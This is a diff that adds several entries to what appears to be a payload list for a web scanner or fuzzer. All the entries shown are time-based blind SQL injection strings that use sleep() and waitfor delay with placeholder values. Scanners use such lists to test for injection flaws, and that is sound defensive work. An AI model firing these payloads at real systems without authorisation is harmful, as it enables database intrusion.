@@ -35,8 +35,11 @@ sleep(__TIME__)#[LF]1
 ")) and sleep(__TIME__)="
 ')) and sleep(__TIME__)='
 ;waitfor delay '0:0:__TIME__'--1
+[VALUE];waitfor delay '0:0:__TIME__'--1
+[VALUE] waitfor delay '0:0:__TIME__'--1
 ;waitfor delay '0:0:__TIME__'--[LF]1
 );waitfor delay '0:0:__TIME__'--1
+[VALUE]);waitfor delay '0:0:__TIME__'--1
 );waitfor delay '0:0:__TIME__'--[LF]1
 ';waitfor delay '0:0:__TIME__'--1
 ';waitfor delay '0:0:__TIME__'--[LF]1
@@ -47,6 +50,7 @@ sleep(__TIME__)#[LF]1
 ");waitfor delay '0:0:__TIME__'--1
 ");waitfor delay '0:0:__TIME__'--[LF]1
 ));waitfor delay '0:0:__TIME__'--1
+[VALUE]));waitfor delay '0:0:__TIME__'--1
 ));waitfor delay '0:0:__TIME__'--[LF]1
 '));waitfor delay '0:0:__TIME__'--1
 '));waitfor delay '0:0:__TIME__'--[LF]1
